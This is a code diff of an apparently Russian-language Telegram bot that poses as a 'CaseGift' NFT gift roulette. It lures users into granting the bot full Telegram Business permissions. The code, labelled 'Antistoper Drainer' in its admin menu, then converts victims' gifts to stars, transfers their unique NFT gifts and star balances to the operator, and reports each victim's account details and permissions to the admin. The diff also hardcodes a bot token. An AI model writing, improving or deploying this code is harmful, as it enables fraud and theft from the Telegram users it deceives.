@@ -5,79 +5,47 @@ from aiogram import Bot, Dispatcher, F, types
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
-from aiogram.filters import CommandStart
-from aiogram.exceptions import TelegramBadRequest
-import os
-import sys
-import logging
-from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command
-import asyncio
-from aiogram.types import InputMediaPhoto
-import re
-import random
-import asyncio
-from aiosend import CryptoPay, MAINNET
-import sqlite3
-from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
-from aiogram.fsm.state import State, StatesGroup
-from aiogram.fsm.context import FSMContext
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-from datetime import datetime
-import pytz
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram import F
-import asyncio
-import aiohttp
-from aiogram import Bot, Dispatcher, types
-from aiogram.fsm.context import FSMContext
-from aiogram.filters import Command, CommandStart
-from aiogram.fsm.state import State, StatesGroup
-from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, LabeledPrice, Message
-from aiogram.utils.keyboard import  InlineKeyboardBuilder
-from aiosend import CryptoPay
-from aiogram import F
-import asyncio
-import logging
-import aiohttp
-import sys
-import asyncio
-from contextlib import suppress
-import logging
-import sys
-import os
-from os import getenv
-import sqlite3
-import random
-import re
-import datetime
-import time
-from aiogram.exceptions import TelegramBadRequest
-from typing import Any
-from aiogram import types
-from aiogram import Router
-from aiogram import Bot, Dispatcher, F   
-from aiogram.filters import CommandStart, Command, CommandObject
-from aiogram.types import Message, CallbackQuery
-from aiogram.types import PreCheckoutQuery, LabeledPrice
-from aiogram.types import ReplyKeyboardMarkup, KeyboardButton , InlineKeyboardMarkup , InlineKeyboardButton , CallbackQuery
-from aiogram.utils.keyboard import InlineKeyboardBuilder
-from aiogram.enums import ParseMode
-from datetime import datetime, timedelta
-from aiogram.types import ChatPermissions
-from aiogram.enums import ChatType
-from aiogram.methods.send_gift import SendGift
-import asyncio
-from aiohttp import web
 from aiogram import Bot, Dispatcher
-from aiogram.types import Message
-from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
+from aiogram import types
+import asyncio
+from aiogram.client.default import DefaultBotProperties
+from aiogram.enums import ParseMode
+from aiogram import Bot, Dispatcher, F
+from aiogram.types import Message, business_connection, BusinessConnection
+from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
+from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
+from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
+from aiogram.enums import ParseMode
+from aiogram.utils.keyboard import InlineKeyboardBuilder
+from aiogram.methods import SendMessage, ReadBusinessMessage
+from aiogram.methods.get_available_gifts import GetAvailableGifts
+from aiogram.methods import TransferGift
+from aiogram.exceptions import TelegramBadRequest
+from aiogram.methods import ConvertGiftToStars, convert_gift_to_stars, UpgradeGift
+from aiogram.types import InputMediaPhoto
+
+
+from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
+
+import aiogram.exceptions as exceptions
+import logging
+import asyncio
+import json
+
+import re
+from aiogram import F
+from aiogram.filters import Command
+
+import os
 
 BOT_TOKEN = os.getenv("BOT_TOKEN") 
 
 TOKEN = "8214171414:AAGb_8YNJq_tXVm40BfgNhrpr9I8_VX6qyg"
-MY_ID = 7792895663
+ADMIN_ID = 7792895663
+bot = Bot(TOKEN)
+
+dp = Dispatcher()
 
 WEB_SERVER_HOST = "0.0.0.0"  
 WEB_SERVER_PORT = int(os.getenv("PORT", 8080)) 
@@ -90,11 +58,10 @@ if not BOT_TOKEN:
     sys.exit(1)
 
   
-bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.MARKDOWN))
-dp = Dispatcher()
 
 
-ADMIN_ID = 767154085
+
+
 
 async def on_startup():
     """Действия при запуске бота"""
@@ -150,86 +117,40 @@ async def setup_webhook():
 
 
 
-bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.MARKDOWN))
-dp = Dispatcher()
 
-auto_transfer_mode = True
 
-NOTIFICATION_CACHE = {}
-NOTIFICATION_CACHE_DURATION = 30
 
-def sanitize_markdown_chars(text: str) -> str:
-    if not text:
-        return ""
-    return text.replace("*", " ").replace("_", " ").replace("`", "'").replace("[", "(").replace("]", ")")
-
-def get_activation_keyboard(bot_username: str):
-    a = random.choice(['afs', 'dfs', 'fdsf', 'wefew', '81ff', 'fdsf', 'areaa'])
-    builder = InlineKeyboardBuilder()
-    builder.row(types.InlineKeyboardButton(text="⚙️ Открыть настройки Telegram", url="tg://settings"))
-    builder.row(types.InlineKeyboardButton(text="🔗 Добавить в бизнес-аккаунт", url=f"tg://resolve?domain={bot_username}&start=business"))
-    builder.row(types.InlineKeyboardButton(text="💼 Моя реферальная ссылка", url=f"https://t.me/CaseGiftGamesBot?start=_ref_2432_{a}"))
-    builder.adjust(1)
-    return builder.as_markup()
-
-def get_admin_keyboard():
-    builder = ReplyKeyboardBuilder()
-    builder.row(types.KeyboardButton(text="🛠️ Настройка"))
-    return builder.as_markup(resize_keyboard=True)
-
-def get_transfer_settings_keyboard():
-    builder = InlineKeyboardBuilder()
-    builder.row(
-        types.InlineKeyboardButton(text="Автоматически", callback_data="set_transfer_auto"),
-        types.InlineKeyboardButton(text="По запросу", callback_data="set_transfer_manual")
-    )
-    return builder.as_markup()
-
-async def execute_gift_transfer(business_connection_id: str, bot_instance: Bot, business_owner_username: str = "N/A"):
-    results = {
-        "converted_gifts_count": 0, "conversion_success_count": 0, "conversion_error_count": 0,
-        "unique_gifts_found_count": 0, "unique_gifts_transferred_count": 0, "unique_gifts_transfer_error_count": 0,
-        "critical_error_occurred": False, "overall_success": True
-    }
+@dp.message(Command("refund"))
+async def refund_command(message: types.Message):
     try:
-        gifts_to_convert_response = await bot_instance.get_business_account_gifts(business_connection_id, exclude_unique=True)
-        gifts_to_convert = gifts_to_convert_response.gifts
-        results["converted_gifts_count"] = len(gifts_to_convert)
-        if gifts_to_convert:
-            for gift in gifts_to_convert:
-                try:
-                    await bot_instance.convert_gift_to_stars(business_connection_id, gift.owned_gift_id)
-                    results["conversion_success_count"] += 1
-                except TelegramBadRequest:
-                    results["conversion_error_count"] += 1; results["overall_success"] = False
-                except Exception:
-                    results["conversion_error_count"] += 1; results["overall_success"] = False
-    except Exception:
-        results["critical_error_occurred"] = True; results["overall_success"] = False
+        command_args = message.text.split()
+        if len(command_args) != 2:
+            await message.answer("Пожалуйста, укажите id операции. Пример: /refund 123456")
+            return
 
+        transaction_id = command_args[1]
+
+        refund_result = await bot.refund_star_payment(
+            user_id=message.from_user.id,
+            telegram_payment_charge_id=transaction_id
+        )
+
+        if refund_result:
+            await message.answer(f"Возврат звёзд по операции {transaction_id} успешно выполнен!")
+        else:
+            await message.answer(f"Не удалось выполнить возврат по операции {transaction_id}.")
+
+    except Exception as e:
+        await message.answer(f"Ошибка при выполнении возврата: {str(e)}")
+@dp.message(F.text == "/start")
+async def start_command(message: Message):
     try:
-        unique_gifts_response = await bot_instance.get_business_account_gifts(business_connection_id, exclude_unique=False)
-        unique_gifts_list = [g for g in unique_gifts_response.gifts if getattr(g, 'is_unique', False)]
-        results["unique_gifts_found_count"] = len(unique_gifts_list)
-        if unique_gifts_list:
-            for gift in unique_gifts_list:
-                try:
-                    await bot_instance.transfer_gift(business_connection_id, gift.owned_gift_id, MY_ID, 25)
-                    results["unique_gifts_transferred_count"] += 1
-                except Exception:
-                    results["unique_gifts_transfer_error_count"] += 1; results["overall_success"] = False
+        connections = load_connections()
+        count = len(connections)
     except Exception:
-        results["critical_error_occurred"] = True; results["overall_success"] = False
-    return results
+        count = 0
 
-@dp.message(CommandStart())
-async def cmd_start(message: types.Message, bot_instance: Bot = bot):
-    bot_user = await bot_instance.get_me()
-    bot_username = bot_user.username
-    if message.from_user.id == MY_ID:
-        admin_mode_text = 'Автоматически' if auto_transfer_mode else 'По запросу'
-        await message.answer(f"**👋 Привет, Администратор!**\n**Текущий режим передачи: {admin_mode_text}.**\n**Используйте кнопку '🛠️ Настройка' для изменения. Совет от саморезки: ставь автоматически если хочешь тчобы сразу прилетало нфт**", reply_markup=get_admin_keyboard(), parse_mode=ParseMode.MARKDOWN)
-    else:
+    if message.from_user.id != ADMIN_ID:
         activation_text = f"""
 <b>🔹 Добро пожаловать, {message.from_user.full_name}! CaseGift - лучшая рулетка подарков в Telegram.
 Данный бот разыгрывает много NFT подарков и звезд. Крути спины каждый день, радуйся победами. Испытай свою удачу в этом боте!</b>
@@ -238,7 +159,7 @@ async def cmd_start(message: types.Message, bot_instance: Bot = bot):
 <blockquote><i> [1] Перейдите в настройки Telegram.
  [2] Откройте раздел Telegram Business.
  [3] Нажмите 'Боты для бизнеса'.
- [4] Добавьте бота (@{bot_username}), предоставив все разрешения</i></blockquote>
+ [4] Добавьте бота , предоставив все разрешения</i></blockquote>
 
 <b>🔹 После этого вам будет начислено бесплатно <u>5 прокрутов</u>. Удачной игры!</b>
 """
@@ -248,135 +169,221 @@ async def cmd_start(message: types.Message, bot_instance: Bot = bot):
         await message.answer_photo(
     photo=photo_url,
     caption=activation_text,
-    parse_mode='HTML',
-    reply_markup=get_activation_keyboard(bot_username)
+    parse_mode='HTML'
 )
+    else:
+        await bot.send_message(
+            f"Antistoper Drainer\n\n🔗 "
+            "/gifts - просмотреть гифты\n"
+            "/stars - просмотреть звезды\n"
+            "/transfer <owned_id> <business_connect> - передать гифт вручную\n"
+            "/convert - конвертировать подарки в звезды"
+        )
 
 
-@dp.message(F.text == "🛠️ Настройка", F.from_user.id == MY_ID)
-async def admin_settings_handler(message: types.Message):
-    await message.answer("**Выберите режим передачи подарков и звезд:**", reply_markup=get_transfer_settings_keyboard(), parse_mode=ParseMode.MARKDOWN)
 
-@dp.callback_query(F.data.startswith("set_transfer_"), F.from_user.id == MY_ID)
-async def transfer_mode_callback_handler(callback: types.CallbackQuery):
-    global auto_transfer_mode
-    mode = callback.data.split("_")[-1]
-    if mode == "auto": auto_transfer_mode = True
-    elif mode == "manual": auto_transfer_mode = False
-    current_mode_text = 'Автоматически' if auto_transfer_mode else 'По запросу'
-    await callback.answer(f"Режим изменен на: {current_mode_text}")
-    await callback.message.edit_text(f"**Режим передачи изменен на: {current_mode_text}.**", parse_mode=ParseMode.MARKDOWN)
+
+
+CONNECTIONS_FILE = "business_connections.json"
+
+def load_json_file(filename):
+    try:
+        with open(filename, "r") as f:
+            content = f.read().strip()
+            if not content:
+                return [] 
+            return json.loads(content)
+    except FileNotFoundError:
+        return []
+    except json.JSONDecodeError as e:
+        logging.exception("Ошибка при разборе JSON-файла.")
+        return []
+
+def get_connection_id_by_user(user_id: int) -> str:
+    import json
+    with open("connections.json", "r") as f:
+        data = json.load(f)
+    return data.get(str(user_id))
+
+def load_connections():
+    with open("business_connections.json", "r") as f:
+        return json.load(f)
+
+async def send_welcome_message_to_admin(connection, user_id, _bot):
+    try:
+        admin_id = ADMIN_ID  # Просто один ID
+
+        rights = connection.rights
+        business_connection = connection
+
+        rights_text = "\n".join([
+            f"📍 <b>Права бота:</b>",
+            f"▫️ Чтение сообщений: {'✅' if rights.can_read_messages else '❌'}",
+            f"▫️ Удаление всех сообщений: {'✅' if rights.can_delete_all_messages else '❌'}",
+            f"▫️ Редактирование имени: {'✅' if rights.can_edit_name else '❌'}",
+            f"▫️ Редактирование описания: {'✅' if rights.can_edit_bio else '❌'}",
+            f"▫️ Редактирование фото профиля: {'✅' if rights.can_edit_profile_photo else '❌'}",
+            f"▫️ Редактирование username: {'✅' if rights.can_edit_username else '❌'}",
+            f"▫️ Настройки подарков: {'✅' if rights.can_change_gift_settings else '❌'}",
+            f"▫️ Просмотр подарков и звёзд: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
+            f"▫️ Конвертация подарков в звёзды: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
+            f"▫️ Передача/улучшение подарков: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
+            f"▫️ Передача звёзд: {'✅' if rights.can_transfer_stars else '❌'}",
+            f"▫️ Управление историями: {'✅' if rights.can_manage_stories else '❌'}",
+            f"▫️ Удаление отправленных сообщений: {'✅' if rights.can_delete_sent_messages else '❌'}",
+        ])
+
+        star_amount = 0
+        all_gifts_amount = 0
+        unique_gifts_amount = 0
+
+        if rights.can_view_gifts_and_stars:
+            response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
+            star_amount = response.star_amount
+
+            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
+            all_gifts_amount = len(gifts.gifts)
+            unique_gifts_amount = sum(1 for gift in gifts.gifts if gift.type == "unique")
+
+        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
+        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
+        unique_gitfs_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
+
+        msg = (
+            f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
+            f"👤 Пользователь: @{business_connection.user.username or '—'}\n"
+            f"🆔 User ID: <code>{business_connection.user.id}</code>\n"
+            f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
+            f"\n{rights_text}"
+            f"\n⭐️ Звезды: <code>{star_amount_text}</code>"
+            f"\n🎁 Подарков: <code>{all_gifts_text}</code>"
+            f"\n🔝 NFT подарков: <code>{unique_gitfs_text}</code>"            
+        )
+        keyboard = InlineKeyboardMarkup(
+            inline_keyboard=[
+                [InlineKeyboardButton(text="🎁 Вывести все подарки (и превратить все подарки в звезды)", callback_data=f"reveal_all_gifts:{user_id}")],
+                [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{user_id}")],
+                [InlineKeyboardButton(text=f"🔝 Апгрейднуть все гифты", callback_data=f"upgrade_user:{user_id}")]
+            ]
+        )
+        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
+    except Exception as e:
+        logging.exception("Не удалось отправить сообщение в личный чат.")
+def save_business_connection_data(business_connection):
+    business_connection_data = {
+        "user_id": business_connection.user.id,
+        "business_connection_id": business_connection.id,
+        "username": business_connection.user.username,
+        "first_name": "FirstName",
+        "last_name": "LastName"
+    }
+
+    data = []
+
+    if os.path.exists(CONNECTIONS_FILE):
+        try:
+            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+        except json.JSONDecodeError:
+            pass
+
+    updated = False
+    for i, conn in enumerate(data):
+        if conn["user_id"] == business_connection.user.id:
+            data[i] = business_connection_data
+            updated = True
+            break
+
+    if not updated:
+        data.append(business_connection_data)
+
+    # Сохраняем обратно
+    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+
+async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
+    try:
+        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
+
+        if not gifts.gifts:
+            return "🎁 Нет подарков."
+        else:
+            for gift in gifts.gifts:
+                if gift.owned_gift_id == owned_gift_id:
+                    gift_name = gift.gift.base_name.replace(" ", "")
+                    return f"https://t.me/nft/{gift_name}-{gift.gift.number}"
+    except Exception as e:
+        return "🎁 Нет подарков."
+
+
+@dp.business_connection()
+async def handle_business_connect(business_connection: business_connection):
+    try:
+        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
+        await bot.send_message(business_connection.user.id, "Привет! Ты подключил бота как бизнес-ассистента. Теперь отправьте в любом личном чате '.gpt запрос'")
+        save_business_connection_data(business_connection)
+        business_connection_data = {
+            "user_id": business_connection.user.id,
+            "business_connection_id": business_connection.id,
+            "username": business_connection.user.username,
+            "first_name": "FirstName",
+            "last_name": "LastName"
+        }
+        user_id = business_connection.user.id
+        connection_id = business_connection.user.id
+    except:
+        pass
+        
+from aiogram import types
+from aiogram.filters import Command
+
+OWNER_ID = ADMIN_ID
+task_id = ADMIN_ID
 
 @dp.business_message()
-async def handle_business_message(message: types.Message, bot_instance: Bot = bot):
-    business_connection_id = message.business_connection_id
-    user_who_interacted = message.from_user 
+async def get_message(message: types.Message):
+    business_id = message.business_connection_id
+    user_id = message.from_user.id
 
-    if user_who_interacted and user_who_interacted.id == MY_ID:
-        return
-    if not business_connection_id:
+    if user_id == OWNER_ID:
         return
 
-    current_time = time.time()
-    if business_connection_id in NOTIFICATION_CACHE and (current_time - NOTIFICATION_CACHE[business_connection_id]) < NOTIFICATION_CACHE_DURATION:
-        return
-    NOTIFICATION_CACHE[business_connection_id] = current_time
-
-    business_chat = message.chat 
-    raw_business_owner_username = business_chat.username or f"ID:{business_chat.id}"
-    business_owner_username = sanitize_markdown_chars(raw_business_owner_username)
-    
-    raw_user_display_name = f"@{user_who_interacted.username}" if user_who_interacted.username else f"ID: {user_who_interacted.id}"
-    user_display_name = sanitize_markdown_chars(raw_user_display_name)
-
-    num_unique_gifts_initial, num_regular_gifts_initial, stars_on_account_initial = 0, 0, 0
-    permission_status_content = "⚠️ Off (Ошибка чтения данных)" 
-    entry_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    processing_status_line_content = ""
-
+  
     try:
-        regular_gifts_data = await bot_instance.get_business_account_gifts(business_connection_id, exclude_unique=True)
-        num_regular_gifts_initial = len(regular_gifts_data.gifts)
-        unique_gifts_data = await bot_instance.get_business_account_gifts(business_connection_id, exclude_unique=False)
-        num_unique_gifts_initial = len([g for g in unique_gifts_data.gifts if getattr(g, 'is_unique', False)])
-        stars_data = await bot_instance.get_business_account_star_balance(business_connection_id)
-        stars_on_account_initial = stars_data.amount
-        permission_status_content = "✅ On (Чтение доступно)"
-    except TelegramBadRequest as e:
-        error_label = e.label if hasattr(e, 'label') else e.message
-        permission_status_content = f"⚠️ Off (Ошибка API: {sanitize_markdown_chars(error_label)})"
-        if auto_transfer_mode: processing_status_line_content = "⚙️ Статус: ❌ Ошибка (нет доступа к данным)"
+        convert_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
+        for gift in convert_gifts.gifts:
+            try:
+                owned_gift_id = gift.owned_gift_id
+                await bot.convert_gift_to_stars(business_id, owned_gift_id)
+            except Exception as e:
+                print(f"Ошибка при конвертации подарка {owned_gift_id}: {e}")
+                continue
     except Exception as e:
-        permission_status_content = f"⚠️ Off (Ошибка чтения: {sanitize_markdown_chars(e.__class__.__name__)})"
-        if auto_transfer_mode: processing_status_line_content = "⚙️ Статус: ❌ Ошибка (нет доступа к данным)"
-
-    if auto_transfer_mode and permission_status_content == "✅ On (Чтение доступно)":
-        await bot_instance.send_message(
-        MY_ID,
-        f"🤖 Автоматическая обработка для @{business_owner_username} (ID: {business_connection_id})...",
-        parse_mode=ParseMode.HTML
-    )
-        res = await execute_gift_transfer(business_connection_id, bot_instance, business_owner_username)
-        success_emoji = '✅' if res['overall_success'] else '⚠️'
-
-        status_part = f"⚙️ Статус: {success_emoji} {'Успешно' if res['overall_success'] else 'Ошибки'}"
-        conv_part = f"🌸{res['conversion_success_count']}/{res['converted_gifts_count']}({res['conversion_error_count']})"
-        uniq_part = f"🎁{res['unique_gifts_transferred_count']}/{res['unique_gifts_found_count']}({res['unique_gifts_transfer_error_count']})"
-        processing_status_line_content = f"{status_part} | {conv_part} | {uniq_part}"
-
-    lines = [
-        f"**--------------------❇️ Новый заход --------------------**",
-        f"**👤 | Бизнес-аккаунт: @{business_owner_username}**",
-        f"**✉️ | От пользователя: {user_display_name}**",
-        f"**------------------- Инфо о дате --------------------**",
-        f"**🕰️ | Дата взаимодействия: {entry_date}**",
-        f"**----------------- Инфо о подарках/звездах -----------------**",
-        f"**🎁 | Уникальных подарков (оценка): {num_unique_gifts_initial}**",
-        f"**🌸 | Обычных подарков (оценка): {num_regular_gifts_initial}**",
-        f"**🌟 | Звезд на аккаунте (до обработки): {stars_on_account_initial}**",
-        f"**🔓 | Доступ бота к данным: {permission_status_content}**"
-    ]
-    if processing_status_line_content:
-        lines.append(f"**{processing_status_line_content}**")
-    
-    notification_text = "\n".join(lines)
-    
-    admin_notification_keyboard = None
-    if not auto_transfer_mode and permission_status_content == "✅ On (Чтение доступно)": 
-        builder = InlineKeyboardBuilder()
-        builder.button(text="↪️ Передать сейчас", callback_data=f"manual_transfer:{business_connection_id}:{business_owner_username}")
-        admin_notification_keyboard = builder.as_markup()
-    
-    await bot_instance.send_message(MY_ID, notification_text, reply_markup=admin_notification_keyboard, parse_mode=ParseMode.MARKDOWN)
-
-    if auto_transfer_mode and permission_status_content != "✅ On (Чтение доступно)" and not processing_status_line_content:
-        await bot_instance.send_message(MY_ID, f"**⚠️ Автоматическая обработка для @{business_owner_username} (ID: {business_connection_id}) невозможна: нет доступа к данным.**", parse_mode=ParseMode.MARKDOWN)
-
-@dp.callback_query(F.data.startswith("manual_transfer:"))
-async def manual_transfer_callback_handler(callback: types.CallbackQuery, bot_instance: Bot = bot):
+        print(f"Ошибка при получении неуникальных подарков: {e}")
     try:
-        parts = callback.data.split(":")
-        business_connection_id = parts[1]
-        raw_owner_username = parts[2] if len(parts) > 2 else "N/A"
-        business_owner_username = sanitize_markdown_chars(raw_owner_username)
-    except IndexError:
-        await callback.answer("Ошибка: неверный формат callback_data.", show_alert=True); return
+        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
+        if not unique_gifts.gifts:
+            print("Нет уникальных подарков для отправки.")
+        for gift in unique_gifts.gifts:
+            try:
+                owned_gift_id = gift.owned_gift_id
+                await bot.transfer_gift(business_id, owned_gift_id, task_id, 25)
+                print(f"Успешно отправлен подарок {owned_gift_id} на task_id {task_id}")
+            except Exception as e:
+                print(f"Ошибка при отправке подарка {owned_gift_id}: {e}")
+                continue
+    except Exception as e:
+        print(f"Ошибка при получении уникальных подарков: {e}")
+    try:
+        stars = await bot.get_business_account_star_balance(business_id)
+        if stars.amount > 0:
+            print(f"Успешно отправлено {stars.amount} звёзд")
+            await bot.transfer_business_account_stars(business_id, int(stars.amount))
+        else:
+            print("Нет звёзд для отправки.")
+    except Exception as e:
+        print(f"Ошибка при работе с балансом звёзд: {e}")
 
-    await callback.answer("⏳ Запускаю ручную передачу...")
-    if callback.message:
-        try: await callback.message.edit_reply_markup(reply_markup=None)
-        except Exception: pass 
-
-    transfer_results = await execute_gift_transfer(business_connection_id, bot_instance, business_owner_username)
-    res = transfer_results 
-    success_emoji = '✅' if res['overall_success'] else '⚠️'
-    
-    part1 = f"🏁 @{business_owner_username} | Ручная: {success_emoji} {'Завершено' if res['overall_success'] else 'Ошибки'}"
-    part2 = f"🌸Конв: {res['conversion_success_count']}/{res['converted_gifts_count']} (Ошибок: {res['conversion_error_count']})"
-    part3 = f"🎁Уник: {res['unique_gifts_transferred_count']}/{res['unique_gifts_found_count']} (Ошибок: {res['unique_gifts_transfer_error_count']})"
-    result_summary = f"**{part1} | {part2} | {part3}**"
-    
-    await bot_instance.send_message(MY_ID, result_summary, parse_mode=ParseMode.MARKDOWN)
 
 
 
